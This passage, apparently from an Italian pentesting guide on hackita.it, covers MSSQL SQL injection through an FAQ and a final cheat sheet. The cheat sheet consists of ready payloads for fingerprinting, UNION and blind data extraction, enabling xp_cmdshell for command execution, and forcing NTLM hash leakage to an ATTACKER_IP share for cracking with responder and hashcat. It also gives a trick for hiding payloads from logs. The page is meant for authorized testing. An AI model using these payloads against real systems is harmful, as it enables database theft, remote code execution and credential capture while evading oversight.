| sqlmap non fingerprinta             | WAF blocca query MSSQL                     | `--string="val" --flush-session --no-cast`                      |
| Stacked query non eseguono          | App/driver non supporta multi-statement    | Usa solo UNION o error-based                                    |
| `WAITFOR` senza ritardo osservabile | App usa timeout basso o connection pooling | Aumenta a 10-15 secondi, verifica che la richiesta sia sincrona |

***

## 18. FAQ {#18}

**Come capisco se è MSSQL e non MySQL?**
Usa `' AND @@CONNECTIONS>0-- -` (solo MSSQL) — se MySQL, questa funzione non esiste e genera errore.

**`-- -` e `--` sono identici?**
Quasi. `--` richiede uno spazio dopo per standard SQL. `-- -` è `--` + spazio + `-` — lo spazio garantisce validità su tutti i parser, anche quelli più permissivi di MSSQL.

**Quando NON conviene usare `' OR 1=1--`?**
Quando l'app si aspetta un solo risultato dalla query: in quel caso genera un errore invece di farti autenticare. Usa `admin'--` per mirare a un utente specifico.

**Le stacked query funzionano sempre su MSSQL?**
Dipende dal driver/framework usato dall'app, non solo dal database — alcuni driver (es. certi ORM) bloccano il multi-statement anche se MSSQL lo supporterebbe.

**Posso arrivare a RCE solo con una SQL Injection?**
Sì, se le stacked query funzionano e l'utente della connessione è sysadmin: abiliti `xp_cmdshell` ed esegui comandi direttamente dalla injection.

***

## 19. Cheat Sheet Finale {#19}

```
=== IDENTIFICAZIONE ===
'  ''  "  ' OR '1'='1  ' AND 1=1-- -  ' AND 1=2-- -

=== FINGERPRINT MSSQL ===
'; WAITFOR DELAY '0:0:5';-- -
' AND @@CONNECTIONS>0-- -
sqlmap -u "URL" --dbms=mssql --banner

=== COMMENTI ===
POST/Burp:  -- -
GET URL:    --+
Spazi:      /**/ al posto degli spazi

=== VARIANTI DA PROVARE (in ordine) ===
' UNION SELECT 1,2,3-- -
') UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -
'/**/UNION/**/SELECT/**/1,2,3-- -
'; SELECT 1;-- -               (conferma stacked)

=== UNION ===
Colonne:  ' ORDER BY N-- -
Visibile: ' UNION SELECT 'hackita',NULL,NULL-- -
DB:       FROM master..sysdatabases
Tabelle:  FROM NomeDB.information_schema.tables
Colonne:  FROM NomeDB.information_schema.columns WHERE table_name='X'
Dump:     SELECT col1+':'+col2 FROM DB..Table FOR XML PATH('')

=== ERROR-BASED ===
' AND 1=CONVERT(int,(SELECT TOP 1 name FROM master..sysdatabases))-- -

=== BLIND ===
Boolean: ' AND SUBSTRING((SELECT...),1,1)='m'-- -
Time:    '; IF(ASCII(SUBSTRING((SELECT...),1,1))=109) WAITFOR DELAY '0:0:5';-- -

=== STACKED → RCE ===
'; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;-- -
'; EXEC master..xp_cmdshell 'whoami';-- -

=== HASH CAPTURE ===
'; EXEC xp_dirtree '\\ATTACKER_IP\share';-- -
→ responder -I tun0 -v → hashcat -m 5600

=== OPSEC ===
Nascondi dai log: payload--sp_password
```

***

## Riferimenti

* [PayloadsAllTheThings – MSSQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
* [pentestmonkey – MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

**Guide correlate su hackita.it:**

* [Pentesting MSSQL: Enumerazione e Attacco sulla Porta 1433](https://hackita.it/articoli/porta-1433-mssql/)
* [sqlmap: Guida Completa](https://hackita.it/articoli/sqlmap)
* [Blind SQL Injection e Automazione con Python](https://hackita.it/articoli/blind-sql-injection)
* [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder)
* [Burp Suite: Intercettare e Modificare Richieste HTTP](https://hackita.it/articoli/burp-suite)

> Uso esclusivo in ambienti autorizzati.
